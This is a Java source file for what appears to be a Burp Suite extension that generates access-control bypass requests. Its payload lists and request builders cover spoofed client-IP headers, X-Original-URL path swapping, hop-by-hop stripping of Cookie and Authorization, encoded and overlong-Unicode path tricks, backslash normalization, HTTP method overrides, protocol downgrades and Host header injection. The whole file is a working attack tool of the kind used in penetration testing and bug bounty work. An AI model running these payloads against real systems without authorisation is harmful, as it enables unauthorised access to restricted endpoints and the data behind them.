package com.bughunter;

import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Generates all bypass payloads as (HttpRequest, description, category) tuples.
 * Expanded to 150+ techniques covering headers, paths, methods, protocols, and more.
 */
public class PayloadGenerator {

    /** A single bypass attempt descriptor */
    public static class Payload {
        public final HttpRequest request;
        public final String description;
        public final String category;

        public Payload(HttpRequest request, String description, String category) {
            this.request = request;
            this.description = description;
            this.category = category;
        }
    }

    // --- IP Spoofing Headers ---
    private static final List<String> IP_HEADERS = Arrays.asList(
            "X-Original-URL", "X-Rewrite-URL", "X-Forwarded-For", "X-Forwarded-Host",
            "X-Host", "X-Custom-IP-Authorization", "Client-IP", "X-Remote-IP",
            "X-Originating-IP", "Fastly-Client-IP", "True-Client-IP", "X-Client-IP",
            "X-Real-IP", "X-Forwarded-Server", "X-Wap-Profile", "X-ProxyUser-Ip",
            "X-Remote-Addr", "CF-Connecting-IP", "X-Azure-ClientIP", "X-Original-Host",
            "X-Backend-Host", "X-Cluster-Client-IP", "Forwarded"
    );

    // --- Path Obfuscation Prefixes ---
    private static final List<String> PATH_PREFIX_PAYLOADS = Arrays.asList(
            "/.", "//", "/./", "/;/", "/.;/", "//;/", "/..;/",
            "/%2e/", "/%2f/", "/%252e/", "/%ef%bc%8f",
            "/%u002e/", "/..%00/", "/..%0d/", "/..%0a/",
            "/.%00/", "/;foo=bar/", "/..%252f"
    );

    // --- Path Obfuscation Suffixes ---
    private static final List<String> PATH_SUFFIX_PAYLOADS = Arrays.asList(
            "?", "??", "&", "#", "%09", "%20", "%00",
            ".json", ".css", ".png", ".js", ".html", ".ico", ".xml", ".txt",
            ";jsessionid=1337", ";type=a", ";", "/..",
            "/", "/.", "/.randomfile", "..;/", "%23",
            "?anything", "#fragment", "%3f", "%26"
    );

    // --- Unicode/Encoding Path Tricks ---
    private static final List<String> UNICODE_PAYLOADS = Arrays.asList(
            "%c0%af",       // Overlong UTF-8 for /
            "%e0%80%af",    // Triple overlong for /
            "%c0%2e",       // Overlong for .
            "%ef%bc%8f",    // Fullwidth solidus U+FF0F
            "%c1%9c",       // Overlong for \
            "%u002e",       // IIS Unicode .
            "%u2215",       // Division slash U+2215
            "%u2216",       // Set minus U+2216
            "%uff0e",       // Fullwidth full stop U+FF0E
            "%e0%80%ae",    // Overlong for .
            "\u2025",       // Two dot leader
            "\u2024"        // One dot leader
    );

    // --- Backslash/Normalization Tricks ---
    private static final List<String> BACKSLASH_PAYLOADS = Arrays.asList(
            "\\", "\\..\\", "\\.\\", "/..\\", "\\../",
            "%5c", "%5c..%5c", "..%5c", "%5c.."
    );

    // --- Header Injection / Misc Headers ---
    private static final List<String> EXTRA_HEADERS_KEYS = Arrays.asList(
            "X-Forwarded-Proto", "X-Forwarded-Scheme", "X-Forwarded-Port",
            "X-Original-Host", "X-Backend-Host", "Content-Length",
            "Transfer-Encoding", "X-Middleware-Override"
    );

    /**
     * Generate all bypass payloads for the given base request and config.
     */
    public static List<Payload> generate(HttpRequestResponse baseRequestResponse, AttackConfig config) {
        List<Payload> payloads = new ArrayList<>();

        HttpRequest original = baseRequestResponse.request();
        String originalPath = original.path();
        String host = baseRequestResponse.httpService().host();
        String scheme = baseRequestResponse.httpService().secure() ? "https://" : "http://";

        List<String> userIPs = config.getUserIPs();
        List<String> userPaths = config.getUserPaths();

        // =====================================================================
        // 1. IP Spoofing & Header Poisoning
        // =====================================================================
        if (config.isIpSpoofing()) {
            for (String header : IP_HEADERS) {
                // Skip URL-related headers here (path swapping handles them)
                if (header.contains("URL") || header.contains("Rewrite")) continue;

                for (String ip : userIPs) {
                    String value = ip;
                    // Forwarded header uses different syntax
                    if (header.equals("Forwarded")) {
                        value = "for=" + ip;
                    }
                    payloads.add(new Payload(
                            original.withHeader(HttpHeader.httpHeader(header, value)),
                            header + ": " + value,
                            "IP Spoofing"
                    ));
                }
            }

            // Dynamic Referer generation
            List<String> referrers = new ArrayList<>();
            referrers.add(scheme + host + originalPath);
            referrers.add(scheme + host + "/");

            // Parent dir walking
            String[] segments = originalPath.split("/");
            StringBuilder parent = new StringBuilder();
            for (int i = 1; i < segments.length - 1; i++) {
                parent.append("/").append(segments[i]);
                referrers.add(scheme + host + parent);
            }

            // Dictionary-based referers
            for (String p : userPaths) {
                String clean = p.startsWith("/") ? p : "/" + p;
                referrers.add(scheme + host + clean);
            }

            for (String ref : referrers) {
                payloads.add(new Payload(
                        original.withHeader(HttpHeader.httpHeader("Referer", ref)),
                        "Referer: " + ref,
                        "Referer Spoofing"
                ));
            }
        }

        // =====================================================================
        // 2. Path Swapping (X-Original-URL, X-Rewrite-URL)
        // =====================================================================
        if (config.isPathSwapping()) {
            List<String> swapHeaders = Arrays.asList("X-Original-URL", "X-Rewrite-URL");
            for (String header : swapHeaders) {
                // Main swap: path=/ and real path in header
                payloads.add(new Payload(
                        original.withPath("/").withHeader(HttpHeader.httpHeader(header, originalPath)),
                        "Path Swap: / + " + header + "=" + originalPath,
                        "Path Swapping"
                ));

                // Dictionary swap
                for (String dictPath : userPaths) {
                    String cleanDictPath = dictPath.startsWith("/") ? dictPath : "/" + dictPath;
                    payloads.add(new Payload(
                            original.withPath("/").withHeader(HttpHeader.httpHeader(header, cleanDictPath)),
                            "Dict Swap: " + header + "=" + cleanDictPath,
                            "Path Swapping"
                    ));
                }
            }
        }

        // =====================================================================
        // 3. Hop-By-Hop Header Abuse
        // =====================================================================
        if (config.isHopByHop()) {
            List<String> hopTargets = new ArrayList<>(IP_HEADERS);
            hopTargets.add("Cookie");
            hopTargets.add("Authorization");
            hopTargets.add("X-Api-Key");
            hopTargets.add("X-Auth-Token");

            for (String hop : hopTargets) {
                payloads.add(new Payload(
                        original.withHeader(HttpHeader.httpHeader("Connection", "close, " + hop)),
                        "Hop-By-Hop Strip: " + hop,
                        "Hop-By-Hop"
                ));
            }

            // Multi-header hop-by-hop
            payloads.add(new Payload(
                    original.withHeader(HttpHeader.httpHeader("Connection", "close, Cookie, Authorization")),
                    "Hop-By-Hop Strip: Cookie + Authorization",
                    "Hop-By-Hop"
            ));
        }

        // =====================================================================
        // 4. Path Obfuscation (Prefixes)
        // =====================================================================
        if (config.isPathObfuscation()) {
            String cleanOriginal = originalPath.startsWith("/") ? originalPath.substring(1) : originalPath;

            for (String prefix : PATH_PREFIX_PAYLOADS) {
                payloads.add(new Payload(
                        original.withPath(prefix + cleanOriginal),
                        "Path Prefix: " + prefix,
                        "Path Obfuscation"
                ));
            }

            // Suffix-based path tricks (e.g., /admin/%2e)
            for (String suffix : Arrays.asList("/%2e", "/%2e/", "/.", "/%00", "%20", "%09")) {
                payloads.add(new Payload(
                        original.withPath(originalPath + suffix),
                        "Path Inline Suffix: " + suffix,
                        "Path Obfuscation"
                ));
            }

            // Double URL encoding
            String doubleEncoded = originalPath.replace("/", "%252f").replace(".", "%252e");
            if (!doubleEncoded.equals(originalPath)) {
                payloads.add(new Payload(
                        original.withPath(doubleEncoded),
                        "Double URL Encoded Path",
                        "Path Obfuscation"
                ));
            }

            // Path segment manipulation with ..;
            payloads.add(new Payload(
                    original.withPath("/..;/" + cleanOriginal),
                    "Path: /..;/ (Tomcat/Spring)",
                    "Path Obfuscation"
            ));
            payloads.add(new Payload(
                    original.withPath("/;" + cleanOriginal),
                    "Path: /; prefix",
                    "Path Obfuscation"
            ));

            // Wildcard tricks
            payloads.add(new Payload(
                    original.withPath(originalPath + "/*"),
                    "Path Wildcard: /*",
                    "Path Obfuscation"
            ));
            payloads.add(new Payload(
                    original.withPath(originalPath + "/*/"),
                    "Path Wildcard: /*/",
                    "Path Obfuscation"
            ));
        }

        // =====================================================================
        // 5. Case Switching
        // =====================================================================
        if (config.isCaseSwitch()) {
            String upperPath = originalPath.toUpperCase();
            if (!upperPath.equals(originalPath)) {
                payloads.add(new Payload(
                        original.withPath(upperPath),
                        "Case: UPPER",
                        "Case Switching"
                ));
            }
            
            // Random case toggle: toggle every other char
            StringBuilder randomCase = new StringBuilder();
            for (int i = 0; i < originalPath.length(); i++) {
                char c = originalPath.charAt(i);
                randomCase.append(i % 2 == 0 ? Character.toUpperCase(c) : Character.toLowerCase(c));
            }
            String randomCasePath = randomCase.toString();
            if (!randomCasePath.equals(originalPath) && !randomCasePath.equals(upperPath)) {
                payloads.add(new Payload(
                        original.withPath(randomCasePath),
                        "Case: Alternating",
                        "Case Switching"
                ));
            }

            // Capitalize first letter of each segment
            String[] segs = originalPath.split("/");
            StringBuilder capitalized = new StringBuilder();
            for (String seg : segs) {
                if (capitalized.length() > 0 || originalPath.startsWith("/")) capitalized.append("/");
                if (!seg.isEmpty()) {
                    capitalized.append(Character.toUpperCase(seg.charAt(0)));
                    if (seg.length() > 1) capitalized.append(seg.substring(1));
                }
            }
            String capPath = capitalized.toString();
            if (!capPath.equals(originalPath) && !capPath.equals(upperPath)) {
                payloads.add(new Payload(
                        original.withPath(capPath),
                        "Case: Capitalized",
                        "Case Switching"
                ));
            }
        }

        // =====================================================================
        // 6. Unicode Normalization Bypass
        // =====================================================================
        if (config.isUnicodeNormalization()) {
            String cleanOriginal = originalPath.startsWith("/") ? originalPath.substring(1) : originalPath;
            for (String uni : UNICODE_PAYLOADS) {
                // Replace / with unicode variant
                payloads.add(new Payload(
                        original.withPath(uni + cleanOriginal),
                        "Unicode Prefix: " + uni,
                        "Unicode Normalization"
                ));
            }

            // Replace . with unicode variants in path
            if (originalPath.contains(".")) {
                for (String dotVariant : Arrays.asList("%2e", "%uff0e", "%u002e", "%c0%2e", "%e0%80%ae")) {
                    String modified = originalPath.replace(".", dotVariant);
                    payloads.add(new Payload(
                            original.withPath(modified),
                            "Unicode Dot: " + dotVariant,
                            "Unicode Normalization"
                    ));
                }
            }
        }

        // =====================================================================
        // 7. Backslash / Normalization Bypass
        // =====================================================================
        if (config.isBackslashBypass()) {
            String cleanOriginal = originalPath.startsWith("/") ? originalPath.substring(1) : originalPath;
            for (String bs : BACKSLASH_PAYLOADS) {
                payloads.add(new Payload(
                        original.withPath(bs + cleanOriginal),
                        "Backslash: " + bs,
                        "Backslash Bypass"
                ));
            }
            // Replace forward slashes with backslashes
            String backslashPath = originalPath.replace("/", "\\");
            if (!backslashPath.equals(originalPath)) {
                payloads.add(new Payload(
                        original.withPath(backslashPath),
                        "Backslash Path: \\ for /",
                        "Backslash Bypass"
                ));
            }
        }

        // =====================================================================
        // 8. Method Tampering & Overrides
        // =====================================================================
        if (config.isMethodTampering()) {
            // Direct method switching
            payloads.add(new Payload(
                    original.withMethod("POST").withBody(""),
                    "Method: POST",
                    "Method Tampering"
            ));
            payloads.add(new Payload(
                    original.withMethod("POST").withBody("")
                            .withHeader(HttpHeader.httpHeader("Content-Length", "0")),
                    "Method: POST + CL:0",
                    "Method Tampering"
            ));
            payloads.add(new Payload(
                    original.withMethod("PUT").withBody(""),
                    "Method: PUT",
                    "Method Tampering"
            ));
            payloads.add(new Payload(
                    original.withMethod("PATCH").withBody(""),
                    "Method: PATCH",
                    "Method Tampering"
            ));
            payloads.add(new Payload(
                    original.withMethod("DELETE"),
                    "Method: DELETE",
                    "Method Tampering"
            ));
            payloads.add(new Payload(
                    original.withMethod("TRACE"),
                    "Method: TRACE",
                    "Method Tampering"
            ));
            payloads.add(new Payload(
                    original.withMethod("HEAD"),
                    "Method: HEAD",
                    "Method Tampering"
            ));
            payloads.add(new Payload(
                    original.withMethod("OPTIONS"),
                    "Method: OPTIONS",
                    "Method Tampering"
            ));
            payloads.add(new Payload(
                    original.withMethod("CONNECT"),
                    "Method: CONNECT",
                    "Method Tampering"
            ));

            // Method Override Headers
            String[] overrideMethods = {"GET", "PUT", "DELETE", "PATCH"};
            String[] overrideHeaders = {
                    "X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override",
                    "X-Original-Method", "_method"
            };
            for (String overrideHeader : overrideHeaders) {
                for (String overrideMethod : overrideMethods) {
                    payloads.add(new Payload(
                            original.withMethod("POST").withBody("")
                                    .withHeader(HttpHeader.httpHeader("Content-Length", "0"))
                                    .withHeader(HttpHeader.httpHeader(overrideHeader, overrideMethod)),
                            "Override: POST + " + overrideHeader + "=" + overrideMethod,
                            "Method Tampering"
                    ));
                }
            }
        }

        // =====================================================================
        // 9. Protocol Downgrade
        // =====================================================================
        if (config.isProtocolDowngrade()) {
            try {
                String rawReq = original.toString();
                Pattern p = Pattern.compile("HTTP/\\d+(\\.\\d+)?");
                Matcher m = p.matcher(rawReq);
                if (m.find()) {
                    for (String version : Arrays.asList("HTTP/0.9", "HTTP/1.0")) {
                        String modifiedRaw = m.replaceFirst(version);
                        HttpRequest protoReq = HttpRequest.httpRequest(baseRequestResponse.httpService(), modifiedRaw);
                        payloads.add(new Payload(
                                protoReq,
                                "Protocol: " + version,
                                "Protocol Downgrade"
                        ));
                    }
                }
            } catch (Exception ignored) {
                // Protocol manipulation may fail on certain request types
            }
        }

        // =====================================================================
        // 10. Suffix Attacks (file extension, query, fragment tricks)
        // =====================================================================
        if (config.isSuffixAttacks()) {
            for (String suffix : PATH_SUFFIX_PAYLOADS) {
                payloads.add(new Payload(
                        original.withPath(originalPath + suffix),
                        "Suffix: " + suffix,
                        "Suffix Attack"
                ));
            }
        }

        // =====================================================================
        // 11. Header Injection (Protocol/Port/Scheme spoofing)
        // =====================================================================
        if (config.isHeaderInjection()) {
            // Protocol spoofing
            payloads.add(new Payload(
                    original.withHeader(HttpHeader.httpHeader("X-Forwarded-Proto", "https")),
                    "X-Forwarded-Proto: https",
                    "Header Injection"
            ));
            payloads.add(new Payload(
                    original.withHeader(HttpHeader.httpHeader("X-Forwarded-Proto", "http")),
                    "X-Forwarded-Proto: http",
                    "Header Injection"
            ));
            payloads.add(new Payload(
                    original.withHeader(HttpHeader.httpHeader("X-Forwarded-Scheme", "https")),
                    "X-Forwarded-Scheme: https",
                    "Header Injection"
            ));
            payloads.add(new Payload(
                    original.withHeader(HttpHeader.httpHeader("X-Forwarded-Scheme", "http")),
                    "X-Forwarded-Scheme: http",
                    "Header Injection"
            ));

            // Port spoofing
            for (String port : Arrays.asList("80", "443", "8080", "8443", "4443")) {
                payloads.add(new Payload(
                        original.withHeader(HttpHeader.httpHeader("X-Forwarded-Port", port)),
                        "X-Forwarded-Port: " + port,
                        "Header Injection"
                ));
            }

            // Host header manipulation
            payloads.add(new Payload(
                    original.withHeader(HttpHeader.httpHeader("Host", "localhost")),
                    "Host: localhost",
                    "Header Injection"
            ));
            payloads.add(new Payload(
                    original.withHeader(HttpHeader.httpHeader("Host", "127.0.0.1")),
                    "Host: 127.0.0.1",
                    "Header Injection"
            ));
            payloads.add(new Payload(
                    original.withHeader(HttpHeader.httpHeader("Host", host + ":443")),
                    "Host: " + host + ":443",
                    "Header Injection"
            ));
            payloads.add(new Payload(
                    original.withHeader(HttpHeader.httpHeader("Host", host + ":8080")),
                    "Host: " + host + ":8080",
                    "Header Injection"
            ));

            // Content-Type manipulation with POST
            for (String ct : Arrays.asList(
                    "application/json", "application/xml",
                    "application/x-www-form-urlencoded", "text/plain")) {
                payloads.add(new Payload(
                        original.withMethod("POST").withBody("")
                                .withHeader(HttpHeader.httpHeader("Content-Type", ct))
                                .withHeader(HttpHeader.httpHeader("Content-Length", "0")),
                        "POST + Content-Type: " + ct,
                        "Header Injection"
                ));
            }

            // Accept header manipulation
            payloads.add(new Payload(
                    original.withHeader(HttpHeader.httpHeader("Accept", "application/json")),
                    "Accept: application/json",
                    "Header Injection"
            ));
            payloads.add(new Payload(
                    original.withHeader(HttpHeader.httpHeader("Accept", "*/*")),
                    "Accept: */*",
                    "Header Injection"
            ));

            // Upgrade-Insecure-Requests
            payloads.add(new Payload(
                    original.withHeader(HttpHeader.httpHeader("Upgrade-Insecure-Requests", "1")),
                    "Upgrade-Insecure-Requests: 1",
                    "Header Injection"
            ));
        }

        return payloads;
    }

    /**
     * Returns the total number of payloads that will be generated for a given config.
     * Used for progress bar calculation.
     */
    public static int estimatePayloadCount(AttackConfig config, String originalPath) {
        // Rough estimate — close enough for progress bar
        int count = 0;
        int ipCount = config.getUserIPs().size();
        int pathCount = config.getUserPaths().size();

        if (config.isIpSpoofing()) {
            count += (IP_HEADERS.size() - 2) * ipCount; // minus URL/Rewrite headers
            count += pathCount + 4; // referers
        }
        if (config.isPathSwapping()) count += 2 + 2 * pathCount;
        if (config.isHopByHop()) count += IP_HEADERS.size() + 5;
        if (config.isPathObfuscation()) count += PATH_PREFIX_PAYLOADS.size() + 10;
        if (config.isCaseSwitch()) count += 3;
        if (config.isUnicodeNormalization()) count += UNICODE_PAYLOADS.size() + 5;
        if (config.isBackslashBypass()) count += BACKSLASH_PAYLOADS.size() + 1;
        if (config.isMethodTampering()) count += 9 + 20; // methods + overrides
        if (config.isProtocolDowngrade()) count += 2;
        if (config.isSuffixAttacks()) count += PATH_SUFFIX_PAYLOADS.size();
        if (config.isHeaderInjection()) count += 20;

        return Math.max(count, 1);
    }
}
